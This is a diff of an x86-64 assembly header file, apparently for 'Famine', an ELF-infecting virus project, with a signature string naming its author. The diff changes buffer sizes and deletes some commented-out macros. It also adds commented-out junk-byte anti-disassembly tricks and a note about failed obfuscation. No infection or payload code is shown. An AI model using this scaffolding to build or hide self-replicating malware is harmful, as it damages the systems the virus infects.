@@ -6,14 +6,13 @@
 %define TMP "infected"
 
 %define FILE_SIZE 256
-%define DIRENT 1024
+%define DIRENT 32768
 %define FSTAT 144
 %define ENTRY 16
 %define MAPPED_FILE 8
 
 
 %define FAMINE_SIZE _v_stop - _famine
-; %define FAMINE_SIZE _end - _famine
 
 ; ELF_HDR_DEFINITION
 %define ET_EXEC 0x02
@@ -40,13 +39,6 @@
 %define SIGNATURE "Famine version 1.0 (c)oded by dbaffier"
 
 %define printf xprintf
-
-; %macro rel_init 0
-    ; call rel_hook
-    ; rel_hook: pop r12
-; %endmacro
-
-; %define rel(offset) r12 + offset - rel_hook
 
 %macro dbg 2
     lea rdi, %1
@@ -147,8 +139,6 @@ struc shdr64
     .sh_entsize:         resq 1
 endstruc
 
-
-
 ; DB allocates in chunks of 1 byte.
 ; DW allocates in chunks of 2 bytes.
 ; DD allocates in chunks of 4 bytes.
@@ -159,19 +149,35 @@ endstruc
 ; RESD 1 allocates 4 bytes.
 ; RESQ 1 allocates 8 bytes.
 
+; tried to obfuscate this with =>
+; sub rsp, 8
+; mov [rsp], rax
+; But it doesn't work (probably cause of flag) so i'm using old techniques
 %macro PUSH 0
     push rax
     push rbx
     push rcx
+;     jmp three + 1
+;     db 0xe9
+; three:
     push rdx
     push rsi
     push rdi
+;     jmp six + 1
+;     db 0xe9
+; six:
     push rbp
     push rsp
     push r8
+;     jmp nine + 1
+;     db 0xe9
+; nine:
     push r9
     push r10
     push r11
+;     jmp twelve + 1
+;     db 0xe9
+; twelve:
     push r12
     push r13
     push r14
